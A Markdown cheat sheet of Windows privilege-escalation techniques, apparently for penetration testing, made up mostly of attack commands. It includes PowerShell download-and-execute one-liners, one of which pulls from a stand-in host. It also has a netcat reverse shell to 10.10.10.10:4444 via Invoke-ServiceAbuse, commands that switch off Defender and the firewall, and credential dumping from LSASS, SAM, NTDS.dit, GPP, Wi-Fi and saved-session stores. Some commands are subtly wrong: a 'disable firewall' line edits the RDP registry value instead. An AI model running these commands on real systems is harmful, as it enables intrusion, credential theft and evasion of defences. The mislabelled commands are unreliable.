# Tools
* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)
```
# Enumeration
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```
* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
* [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
```
* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
```
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```
* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
* [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
```
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```
* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```
* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
```
winpeas.exe
```
* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)
```
# First obtain systeminfo
systeminfo
systeminfo > systeminfo.txt
# Then feed it to wesng
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt
```
* [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,H
```
# Windows Initial Checks
## Basic Info
### Basic commands
Host version:
```
hostname
systeminfo
systeminfo | findstr /b /C:"OS Name" /C"OS Version"
```
Extract patchs and updates:
```
wmic qfe
```
Architecture:
```
wmic os get osarchitecture || echo
```
List all env variables
```
set
Get-ChildItem Env: | ft Key,Value
```
## Blind files
```
C:\Windows\System32\license.rtf
C:\Windows\System32\eula.txt
```
## Powershell
If the following command doesn't work, assume it's powershell 1.0.
```
powershell -Command "$PSVersionTable.PSVersion"
```
## AV Enumeration
AV State:
```
# Check registry
sc query windefend

# check status of Defender
Get-MpComputerStatus
```
Disable AV:
```
# disable scanning all downloaded files and attachments, disable AMSI (reactive)
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
Set-MpPreference -DisableScriptScanning 1 

# exclude a folder
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Network Info
### Network Details
Interfaces, IP and DNS:
```
ipconfig /all  
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
Routing table:
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
ARP table:
```
arp -A  
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
Current connections:
```
netstat -ano
net stat
```
Network shares:
```
net share
powershell Find-DomainShare -ComputerDomain domain.local
```
SNMP configuration:
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
### Firewall  
Firewall state and current configuration:
```
netsh firewall show state  
netsh firewall show config  
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```
Firewall's blocked ports:
```
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```
Disable firewall:
```
# Disable Firewall on Windows 7 via cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable Firewall on Windows 7 via Powershell
powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

# Disable Firewall on any windows via cmd
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
```
### Network capture
```
tcpdump -D
WinDump.exe
```
## Users and Groups
### Info about current user
```
echo %USERNAME%  
echo %USERNAME% || whoami
$env:username
net user %USERNAME%
whoami
whoami /priv
whoami /groups
```
### Local
List all Local Users:
```
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
List all Local Groups:
```
net localgroup  
```
Check who is a member of the local group "Administrators":
```
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Domain
Users in a domain:  
```
net user /domain  
```
Groups in a domain:
```
net group /domain  
net group /domain &lt;Group Name&gt;  
```
Get Domain controllers:
```
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```
# CVEs
## Patch Level  
```
wmic qfe get Caption, Description
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
## Applications
```
wmic product get name, version, vendor
```
##  Device Drivers and Kernel Modules
```
wmic logicaldisk get Caption
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis
play Name’, ‘Start Mode’, Path
driverquery.exe /fo table /si
DriverQuery.exe --no-msft

Get-WmiObject Win32\_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$\_.DeviceName -like "\*VMware\*"}

Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
# Sensitive data
## Show Unmounted Disks
```
mountvol

mountvol c:\\test \\\?\\Volume{93131ba8-0000-0000-0000-100000000000}\
```
## Passwords reuse
### cmdkey
\*If there are entries, it means that we may able to runas certain user who stored his cred in windows\* 
```
cmdkey /list 
```
## Passwords in memory
### LSASS
Dump the lsass.exe process to a file using Windows built-in Task Manager with right-clicking “lsass.exe” then selecting “Create Dump File” (since Vista) or [Procdump](http://technet.microsoft.com/en-au/sysinternals/dd996900.aspx)(pre Vista) – alternatively, use some [powershell-fu](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)(see [carnal0wnage](http://carnal0wnage.attackresearch.com/2013/07/mimikatz-minidump-and-mimikatz-via-bat.html)blog post):
```
C:\> procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
```
Then dump the credentials offline using mimikatz and its minidump module:
```
C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
```
## Passwords in files
### Alternate data stream
```
Get-Item -path flag.txt -Stream *
Get-Content -path flag.txt -Stream Flag
```
### SAM Files
```
%SYSTEMROOT%\\repair\\SAM  
%SYSTEMROOT%\\System32\\config\\RegBack\\SAM  
%SYSTEMROOT%\\System32\\config\\SAM  
%SYSTEMROOT%\\repair\\system  
%SYSTEMROOT%\\System32\\config\\SYSTEM  
%SYSTEMROOT%\\System32\\config\\RegBack\\system  
```
Generate a hash file for john:
```
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```
### Common files to check
```
c:\\sysprep.inf  
c:\\sysprep\\sysprep.xml  
c:\\unattend.xml
C:\\Windows\\Panther\\Unattend.xml
C:\\Windows\\Panther\\Unattend\\Unattend.xml
%WINDIR%\\Panther\\Unattend\\Unattended.xml  
%WINDIR%\\Panther\\Unattended.xml
C:\Windows\system32\sysprep.inf 
C:\Windows\system32\sysprep\sysprep.xml

# Display the content of these files
dir /s \*sysprep.inf \*sysprep.xml \*unattended.xml \*unattend.xml *unattend.txt 2>nul
dir /b /s web.config  
dir /b /s \*pass\*  

dir c:\\*vnc.ini /s /b  
dir c:\\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite
%USERPROFILE%\\AppData\\Roaming\\FileZilla\\sitemanager.xml
%USERPROFILE%\\Documents\\SuperPuTTY\\Sessions.xml
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```
## IIS Web Config
Find configuration files:
```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Look for default locations:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```
### Raw text search
```
# Search for files with a certain filename
dir /s \*pass\* == \*cred\* == \*vnc\* == *.config*  
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

# Search for keywords in files 
findstr /si password *.xml *.ini *.txt
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
findstr /si pass/pwd *.ini 
```
## Passwords in Registry
### SAM 
#### Windows VM
```
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```
#### Kali VM
```
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
### VNC  
```
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query "HKCU\\Software\\TightVNC\\Server"  
```
### Windows autologin  
```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"  
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
```
### WIFI 
Find AP SSID:
```
netsh wlan show profile
```
Get cleartext passwords:
```
netsh wlan show profile <SSID> key=clear
```
Onliner for all AP:
```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### SNMP Paramters  
```
reg query "HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP"  
```
### Putty  
```
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"  
```
### WinSCP
```
reg query "HKCU\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
```
### RDP
```
reg query "HKCU\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers"
```
### Key manager (GUI)
```
rundll32 keymgr,KRShowKeyMgr
```
### Windows Data Protection API 
Dump passwords with [Netpass](http://www.nirsoft.net/utils/network_password_recovery.html):
```
netpass.exe
```
### IE/Outlook/MSN
Dump passwords with [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html):
```
pspv.exe
```
NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.
### Raw text search
```
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
REG QUERY HKLM /F "password" /t REG_SZ /S /K 
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
### Domain Controllers
#### GPP
Browse shares on the domain controller for passwords in Group Policy Preferences (GPP) that can be [decrypted](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html):
```
findstr /S cpassword \\dc1.securus.corp.com\sysvol\*.xml \\192.168.122.55\sysvol\securus.corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml: ="" description="" cpassword="1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="1" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/>
```
Decrypt the passwords:
```
ruby gppdecrypt.rb 1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs1q2w3e4r5t
```
####  AD database (Volume Shadow Copy)
If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
```
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
# List shadow copies using diskshadow
diskshadow list shadows all
  
# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
##### Windows VM
This technique consists of retrieving the Active Directory database from the Directory Service running on the Domain Controller, also known as the “ntds.dit” file. The idea is to use the Volume Shadow Copy functionality to grab a copy of the “ntds.dit” file, which would be locked & protected from read access otherwise.
First, take note of the state of the Volume Shadow Copy service before going any further. If the Volume Shadow Copy service is not already running, which isn’t by default, then using ntdsutil or vssadmin as described below will start the service for you. Remember to set the service back to its original state once finished.

Then, confirm the location of the ntds.dit file from the “DSA Database file” parameter:
```
C:\> reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
```
At this stage, check the current size of the ntds.dit file and make sure there is at least twice as much free disk space. Once this is done, use the Windows built-in command-line tool [ntdsutil](http://technet.microsoft.com/en-us/library/cc753343.aspx) to create a snapshot of the active directory database.
```
C:\> ntdsutil
ntdsutil: snapshot
snapshot: activate instance NTDS
Active instance set to "NTDS".
snapshot: list all
No snapshots found.
// If there is a recent snapshot (ie. backups scheduled with Windows Server Backup), then consider using that instead of creating a new one.)
snapshot: create
Creating snapshot...
Snapshot set {ef026688-4c02-48b6-bc24-24df118eb7a2} generated successfully.
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1}
snapshot: mount 2
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} mounted as C:\$SNAP_201310241833_VOLUMEC$\
```
Now download the ntds.dit file from C:\\$SNAP\_201310241833\_VOLUMEC$\\Windows\\NTDS\ and also get a copy of the SYSTEM registry hive (eg. reg.exe save HKLM\\SYSTEM c:\\system.save).

Cleanup when done. Delete the copy of the system hive, and remove the snapshot:
```
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} C:\$SNAP_201310241833_VOLUMEC$\
snapshot: unmount 2
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} unmounted.
snapshot: list all
1: 2013/10/24:18:33 {ef026688-4c02-48b6-bc24-24df118eb7a2}
2: C: {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1}
snapshot: delete 1
Snapshot {5b8a2cd1-3f1a-4e32-8137-b8966699d2e1} deleted.
snapshot: ^C
```
Restore the VSS service back to its original state (ie. stop the service if it wasn’t running before, disable the service if you had to enable it etc.).

Note that you could also use the Windows built-in tool vssadmin (as in this [howto](http://www.pentestgeek.com/2013/01/10/psexec_command-not-your-daddys-psexec/)), however vssadmin will not get you a “consistent” snapshot whereas ntdsutil is the correct tool to properly backup the ntds database. That said, ntdsutil on Windows 2003 can’t create snapshots so vssadmin should be used instead in this particular case.

If ntds.dit appears to be corrupted, use the built-in command-line tool [esentutl](http://technet.microsoft.com/en-us/library/hh875546.aspx) to try to repair it:
```
C:\> esentutl /p /o ntds.dit
```
##### Kali VM
Now it’s time to dump password hashes using [secretsdump](http://code.google.com/p/impacket/source/browse/trunk/examples/secretsdump.py):
```
    $ secretsdump.py -system system.save -ntds ntds.dit LOCAL
    Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies
    
    [*] Target system bootKey: 0x24f65609994cdbec01b8b0b61cf6a332
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] Pek found and decrypted: 0xca47b3a8b3477cec0a774bed669c3d9f
    [*] Reading and decrypting hashes from ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:a881324bad161293dedc71817988d944:::
    ...
```
You can also dump the password history with the -history option (since [r961](http://code.google.com/p/impacket/source/detail?r=961)).
####  AD database (AD Replication)
[Dumping Windows Credentials - Pure Security](https://pure.security/dumping-windows-credentials/)
# Misconfigurations 
## Global path
If any part of the SYSTEM %PATH% variable is writeable by Authenticated Users, privesc exists

Many applications don't use full path

If system32 is not first entry in path this is bad
```
reg query HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment
$env:Path
```
## Find Readable/Writable Files and Directories
```
accesschk.exe -uws "Everyone" "C:\\Program Files"

Get-ChildItem "C:\\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\\sAllow\\s\\sModify"}
```
## Find named pipes
Find named pipes: 
```
[System.IO.Directory]::GetFiles("\\.\pipe\")
```
Check named pipes DACL:
```
pipesec.exe <named_pipe>
```
Use reverse engineering software to find the good payload.
Send data throught the named pipe :
```
program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
```
## Binaries That AutoElevate
\*\*If these are set we could run an msi to elevate privleges\*\*
```
reg query HKEY\_CURRENT\_USER\\Software\\Policies\\Microsoft\\Windows\\Installer

reg query HKEY\_LOCAL\_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer
```
## Scheduled Tasks  
```
# schtsaks
schtasks /query /fo LIST
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

# powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# File System
dir c:\\windows\\tasks\  
dir c:\\windows\\system32\\tasks\  

# Info on specific task
schtasks /query /v /fo list /tn "\\System Maintenance"
```
## Startup tasks
```
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```
## Privileges 

### AlwaysInstallElevated
If 64 bits use:  %SystemRoot%\\Sysnative\\reg.exe:
```
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated  
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```
PowerUp:
```
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated"
```
## Active process and services
### Find what is running on the machine
Process:
```
tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```
Process running as system:
```
tasklist /v /fi "username eq system"
```
Services:
```
sc queryex type= service
```
Installed progams:
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Find Non-Standard Services
Requires powershell:
```
Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'} | findstr /v /i "Microsoft" | findstr /v /i "windows" | findstr /v /i "vmware"
```
### Unquoted Service Path
Command lines:
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
### DLL Hijacking
Find PATH directories with weak permissions:
```
$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
Find missing DLL with PowerUp:
```
Find-PathDLLHijack PowerUp.ps1
```
Or use Process Monitor and check for "Name Not Found".
### Start mode of service
```
wmic service where caption="Serviio" get name, caption, state, startmode
```
### Permissions for all services
```
accesschk.exe -uwcqv * /accepteula
```
### Weak Service Permissions
Find Services that can be modified
```
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Power Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
```
### Permission for service exe file
```
icacls "C:\\Program Files\\Serviio\\bin\\ServiioService.exe"
```
### wmic
```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\\windows\\temp\\service_exes.txt

echo "" > c:\\windows\\temp\\exe_permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\\windows\\temp\\service\_exes.txt) do cmd.exe /c icacls "%a" >> c:\\windows\\temp\\exe\_permissions.txt
```
### Service Details
```
sc qc \\&lt;Service Name&gt;
```
### Service Permissions
```
accesschk.exe -ucqv \\&lt;Service Name&gt;  
```
### Output Service Info
```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY\_PATH\_NAME" >> path.txt
```
## File Permissions
\*Check permissions on file (Look for W or F tag) and substitute if possible\*
```
icacls scsiaccess.exe
```
## Registry Key permissions
```
subinacl /keyreg HKEY\_LOCAL\_MACHINE/software/microsoft
```
## Printers


# Ressources
[PayloadsAllTheThings/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[SessionGopher](https://github.com/Arvanaghi/SessionGopher)
